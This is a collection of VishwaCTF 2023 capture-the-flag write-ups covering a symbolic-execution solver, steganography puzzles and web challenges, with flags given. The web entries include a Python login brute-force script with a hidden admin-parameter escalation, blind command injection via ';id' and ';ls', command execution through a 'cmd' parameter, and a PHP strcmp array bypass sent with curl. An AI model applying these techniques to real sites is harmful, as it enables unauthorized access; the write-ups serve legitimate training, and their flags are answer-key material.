    state = project.factory.entry_state(args=[binary_path, flag])
    for k in flag_chars:
        state.solver.add(k >= 0x41)  
        state.solver.add(k <= 0x5a)

    
    simgr = project.factory.simulation_manager(state)

    
    def correct(state):
        try:
            return b'You win!' in state.posix.dumps(1)
        except:
            return False

    def wrong(state):
        try:
            return b"Sorry, try again." in state.posix.dumps(1)
        except:
            return False

   
    simgr.explore(find=correct, avoid=wrong)

    
    if simgr.found:
        found_state = simgr.found[0]
        solution = found_state.solver.eval(flag, cast_to=bytes).decode(errors='ignore')
        return solution
    else:
        return "No solution found"

if __name__ == '__main__':
    solution = main()
    print(f"Correct input string: {solution}")

flag: VishwaCTF{N3V3r_60NN4_61V3_Y0U_UP}



### File: writeups/VishwaCTF2023/steganography/CID.md

# **Writeup - VishwaCTF**

* Category **Steganography**
* Name **CID**
* Difficulty **Medium**


## Description

Watch the image carefully !!

## **Solution**

I got an image with white text on black background, gotta look at the metadata,
```
$ exiv2 -p all print case69.jpg
Xmp.xmpRights.Certificate                    XmpText    42  This is for you PASS='daya darwaza tod do'
```

this $PASS looks like a password, let's keep it in mind

looking for other informations i could read the output of xxd,

```
$ xxd case69.jpg
...

bunch of other data
...
00107360: 8185 0014 00da 0428 a005 c500 18a0 04c5  .......(........
00107370: 0034 8a00 00a0 05c5 1701 2980 5001 401f  .4........).P.@.
00107380: ffd9 377a bcaf 271c 0004 7d50 d2d9 43c3  ..7z..'...}P..C.
00107390: 0000 0000 0000 2500 0000 0000 0000 69fb  ......%.......i.
001073a0: d03a ffef 6560 6f5d 007f b61b edf0 8440  .:..e`o].......@
...

bunch of other data
...
```

looks like the end of file marker (0xffd9) isn't actually at the end, trim the actual jpeg data, analyze what's left and

```
$ file remaining_data
remaining_data: 7-zip archive data, version 0.4
```

it's a 7-zip archive

after extracting it i'm left with a directory full of images, they all look the same, let's see if there's one that's special

```
$ sha256sum CID\ HQ/* | uniq --check-chars=16
4a3885cdc4b8753dfec6da67a5e98b86e4f45ae4d956915b7ab309c016ad7484  CID HQ/1000.jpg
f50dc3ac1b2fbe8e26a8f225d1d80a492e5901e7385feeccf2608df1694db139  CID HQ/369.jpg
4a3885cdc4b8753dfec6da67a5e98b86e4f45ae4d956915b7ab309c016ad7484  CID HQ/36.jpg
6d31ce13140fad62d9a626d50a730beb7e32085047b23b85e8f59598a17c547a  CID HQ/500_info_for_you.txt
4a3885cdc4b8753dfec6da67a5e98b86e4f45ae4d956915b7ab309c016ad7484  CID HQ/500.jpg
```

looks like 369 is the chosen one with an hash that's unlike any other,

maybe it hides something as well, also it feels like the right time to use the password, so i use steghide to try extracting it

```
$ steghide extract -sf 369.jpg
Enter passphrase: 
wrote extracted data to "flag.txt".
```

eureka! the flag is here

flag: vishwaCTF{my_GOD_D4ya_tumn3_t0_fl4g_dhund_liy4....}


### File: writeups/VishwaCTF2023/steganography/Guatemala.md

# **Writeup - VishwaCTF**

* Category **Steganography**
* Name **Guatemala**
* Difficulty **Easy**


## Description

My friend wanted to install an antivirus for his computer, but the creator of the antivirus was caught!

## **Solution**

I used metadata2go.com to check the metadata of AV.gif, then I pasted the comment on CyberChef to find that it was the flag in base 64: 
dmlzaHdhQ1RGe3ByMDczYzdfdXJfM1gxRn0= -> vishwaCTF{pr073c7_ur_3X1F}



### File: writeups/VishwaCTF2023/steganography/I LOVE YOU.md

# **Writeup - VishwaCTF**

* Category **steganography** 
* Name **I LOVE YOU** 
* Difficulty **Medium**


## Description

There is an audio file given below... It is not so difficult but you will find it's sound very deep



## **Solution**

You have a file called "lam.wav", use **DeepSound** on the wave and you get "welcome.exe", decompile it and do some OSINT, search who is Tony Stark's best friend and take the flag.

flag: **VishwaCTF{James_2008}**



### File: writeups/VishwaCTF2023/steganography/Just Files.md

# **Writeup - VishwaCTF**

* Category **steganography** 
* Name **Just Files** 
* Difficulty **Medium**


## Description

They are not what you see. They are different. Believe me.


## **Solution**

First, use **binwalk** and get the Morse Code and the .wav inside the zip. 

*Morse Code*:
R E V E R S E T H E A U D I O A N D Y O U S H O U L D F I N D N A M E O F P R O T A G O N I S T . I T O L D Y O U T H A T S T O R Y I N P N G F I L E ." 

If you reverse the .wav you can listen at **Lucifer Morningstar** which says the name of Jimmy (Jimmy Barners). 

If you look at the header there's also "S01E03". 

flag: **VishwaCTF{Lucifer_S01E03}**



### File: writeups/VishwaCTF2023/steganography/Quick Heal.md

# **Writeup - VishwaCTF**

* Category **steganography** 
* Name **Quick Heal** 
* Difficulty **Medium**


## Description

Security Simplified!!

(Everything is there)

## **Solution**

To extract all the frames from the .mkv video, use a media player (VLC) that allows you to save individual frames as image files. 

1. Open VLC and go to Media
2. Select "Convert"
3. Click Add and insert ur file
4. Put the destination

Now that you have the audio file, you can use Audacity to extract the other part of the flag. Open Audacity and import the audio file you just extracted.

flag: **VishwaCTF{S3cur1ty_S1mpl1f13d_5NJ0Y_C0UP0NS}**





### File: writeups/VishwaCTF2023/steganography/XOR.md

# **Writeup - VishwaCTF**

* Category **Steganography** <!-- challenge category -->
* Name **XOR** <!-- challenge name -->
* Difficulty **Medium**

## Description
My friend sent me a clip and I found it to be very interesting. I wanted to watch the full video but before I could rewatch the clip, he deleted it!! All I have right now is this image he sent me afterwards. Can you help me find the video link?

## **Solution**
The only file we had was an image, so the first thing to do was executing exiftool on the image in order to know more about the image with:
```sh
exiftool BossCat.jpg 
```
With the command we see there is a field name License that seems in the format of a base 64 or base 32. So by using:
```sh
echo "IFAUCLJXLIWUKQZTGIWUIMZS" | base32 -d
```
We obtain "AAA-7Z-EC32-D32" that maybe is a password for something. At this point we try to use steghide on image to see if there is something to extract, using the string obtained from the previous step as password. So executing:
```sh
steghide extract -sf BossCat.jpg
```
Extracted data are wrote into an archive secret.zip, and extracting files from it we obtain two images "n1.png" and "n2.png". So the last step to do, as the title of the challenge is XOR, is to xor the two images with the following python code:
```Python
from PIL import Image, ImageChops  
  
im1 = Image.open("n1.png").convert("1")  
im2 = Image.open("n2.png").convert("1")  
  
# applying logical_xor method  
im3 = ImageChops.logical_xor(im1, im2)  
im3.save('xored.png')
```
The obtained image contain a link which is the content of the flag, so the flag is: VishwaCTF{https://youtu.be/LlhKZaQk860}


### File: writeups/VishwaCTF2023/steganography/can_you_see_me.md

# **Writeup - VishwaCTF**

* Category **Steganography**
* Name **Can you see me?**
* Difficulty **Easy**


## Description

A magician made the seven wonders disappear. But people claim they can still feel their presence in the air.

## **Solution**

The challenge gave me an image of the seven wonders, let's see if there are interesting strings inside

```
$ strings havealook.jpg
...

**a bunch of garbage**

...
h       CA
q!|&
[YoBt
Z       hPy
*$# 
{!,B
{y}D
        HoEi//
A*Ve
,U~N
VZHV
hereissomething.wavPK
```

`hereissomething.wav`, interesting, it's an uncommon string to find in a jpeg, also the letters `PK` besides it remind of a zip archive. Let's try extracting whatever it is

```
$ unzip havealook.jpg
Archive:  havealook.jpg
warning [havealook.jpg]:  134855 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: hereissomething.wav
```

so it was really a zip archive after all.

Let's try listening to this something

```
$ ffplay hereissomething.wav
```

it certainly isn't pleasing to hear, but the spectrogram shows something interesting, it's the flag:
* vishwaCTF{n0w_y0u_533_m3}


### File: writeups/VishwaCTF2023/template.md

# **Writeup - VishwaCTF**

* Category **CHANGEME** <!-- challenge category -->
* Name **Change me** <!-- challenge name -->
* Difficulty **GODLIKE**

## Description
Challenge description.


## **Solution**

<!-- put your solution here -->



### File: writeups/VishwaCTF2023/web/Mascot.md

# **Writeup - VishwaCTF**

* Category **WEB** <!-- challenge category -->
* Name **Mascot** <!-- challenge name -->
* Difficulty **Medium**

## Description
The challenge show us a site, and the description talks about a very gracious host. 

## **Solution**
Now it is possible to observe that the only purpose of the page is to allow users to play criss-cross game. There weren't no hints from the page so we tried to recover information with gospider but no sitemap was available. So we tried using dirb from kali command line and using the command:
```sh
dirb https://ch54763117938.ch.eng.run/ /usr/share/wordlists/dirb/common.txt 
```
The first directory founded by dirb is .git directory, as shown in the image: ![screen.png](screen.png) In this folder we can retrieve information about a precise repository. Indeed, we found inside the config file the reference to a github repository. In the linked repository in config file we can found a file named "FLAGGGGG.md" in which is saved the flag **VishwaCTF{0ctOc@t_Ma5c0t}**



### File: writeups/VishwaCTF2023/web/Payload.md

# **Writeup - VishwaCTF**

* Category **web** 
* Name **Payload** 
* Difficulty **Medium**


## Description

No description.





## **Solution**

On the website you can see that there is a button "System details", when you press it something change in the **URL**

- Normal URL: https://ch42763117925.ch.eng.run/
- After: https://ch42763117925.ch.eng.run/?btn=

I put "robots.txt" in the URL and there's a source code when I open it.

As you can see in the code, you can run a command using the **cmd** parameter.

If you **cat** "index.php" and look at the source code you can see the flag.

flag: **VishwaCTF{y0u_f-o-u-n-d_M3}**


### File: writeups/VishwaCTF2023/web/Spooky.md

# **Writeup - VishwaCTF**

* Category **WEB** <!-- challenge category -->
* Name **Spooky** <!-- challenge name -->
* Difficulty **Medium**

## Description
The challenge show us a site, and the description report that a user forgot his login credentials. The scope of the challenge was to recover the forgotten credentials.

## **Solution**
Firstly looking at the web interface there weren't clues about what to do. So to retrieve more information there were two possibilities:
* Use dirb to see if there are some useful folders to retrieve information.
* Use gospider in order to try to retrieve sitemap.xml or robots.txt

So trying the second way by executing the command:
```shell
gospider -s https://ch39763117927.ch.eng.run/ --sitemap
```
from the sitemap.xml file we discover there are two interesting files inside creds folder, namely pass.txt and user.txt, containing list of user and password of the site. At this point in order to login we bruteforce for every user in users.txt all passwords in pass.txt. It is possible to do this from script using following code
```Python
import requests  
  
url = "https://ch39763117934.ch.eng.run/"  
user_res = requests.get(f"{url}/creds/users.txt")  
users = user_res.text.strip(' \n').split('\n')  
password_res = requests.get(f"{url}/creds/pass.txt")  
passwords = password_res.text.strip(' \n').split('\n')  
correct = tuple()  
  
for user in users:  
	for password in passwords:  
		res = requests.post(f"{url}/login.php", data={"user": user, "pass": password})  
		# log print  
		print(user, password)  
		if "Incorrect" not in res.text:  
			print(res.text)  
			correct = (user, password)  
			break  
	if "Incorrect" not in res.text:  
		break
```
At this point we are logged in as user shrekop, with password "VmU5gnXKYN2vLp48", but there's no flag on the page. After thinking about it, the first idea was insert an additional param ```admin='true'``` in the form in order maybe to become admin with the code lines:
```Python
res = requests.post("https://ch39763117927.ch.eng.run/login.php", data={"user": correct[0], "pass": correct[1], 'admin': 'true'})  
print(res.text)
```
This worked as the response was:
```html
<b>Logged in as </b> shrekop (admin)<script>alert('Congratulations. You got the flag!');</script><script>alert('VishwaCTF{h1dd3n_P@raMs}');</script>
```



### File: writeups/VishwaCTF2023/web/aLive.md

# **Writeup - VishwaCTF**

* Category **web** 
* Name **aLive** 
* Difficulty **Medium**


## Description

In my college level project I created this website that tells us if any domain/ip is active or not. But there is a catch.


## **Solution**

The proper method to solve this challenge was doing a **Blind Command Injection**.

Try to put ;id and see what happens. You have to use **netcat** and send the ;ls command. You'll see that there's a file called "flag.txt". 

To print the flag, we can use the **cat** command or we can access to the directory (add /flag.txt to the URL). 

flag: **VishwaCTF{b1inD_cmd-i}**



### File: writeups/VishwaCTF2023/web/eeezzy.md

# **Writeup - VishwaCTF**

* Category **Web**
* Name **Eeezzy**
* Difficulty **Easy**

## Description
The challenge was about bypassing a login in php.
Viewing the source of the page, we can see the php code used for the login:
```
 <?php

    session_start();
    $_SESSION['status']=null;

    $flag="";
    try {
        if (isset($_GET['username']) && isset($_GET['password'])) {
            if (strcmp($_GET['username'], $flag)==0 && strcmp($_GET['password'], $flag)==0)
                $_SESSION['status']=$flag;
            else
                $_SESSION['status']="Invalid username or password";
        }
    } catch (Throwable $th) {
        $_SESSION['status']=$flag;
    }

?> 
```
We can see that there is a `strcmp` between our get parameters (username, password) and something we don't know.
This check is inside a try catch block and if it catches a `throwable` it will print the flag.

## Solution
Send the GET parameters as array so `strcmp` will throw an error.
`curl https://ch41763110254.ch.eng.run/?username=aaa&password[]=[]&submit=Login`

`VishwaCTF{5t0p_c0mp4r1ng}`



### File: writeups/VishwaCTF2023/welcome/Nice guys finish last.md

# **Writeup - VishwaCTF**

* Category **Welcome** 
* Name **Nice guys finish last** 
* Difficulty **Beginner**


## Description

Nice guys finish last, but following the rules just may gain you some points!


## **Solution**

The flag was in the "rules-and-announcements" channel into the VishwaCTF discord: https://discord.com/invite/b8teUpewUQ

flag: **VishwaCTF{g3n3r1c_d1sc0rd_fl4g}**



### File: writeups/VishwaCTF2023/welcome/Welcome to VISHWACTF'23!.md

# **Writeup - VishwaCTF**

* Category **Welcome** 
* Name **Welcome to VISHWACTF'23!** 
* Difficulty **Beginner**


## Description

Here you go with your first flag!!!

VishwaCTF{w3_ar3_an0nym0u5_w3_4r3_l3g1on_w3_d0_not_f0rg1v3_w3_do_not_f0rg3t}

Happy Hacking


## **Solution**

That was simply a sanity check.

flag: **VishwaCTF{w3_ar3_an0nym0u5_w3_4r3_l3g1on_w3_d0_not_f0rg1v3_w3_do_not_f0rg3t}**

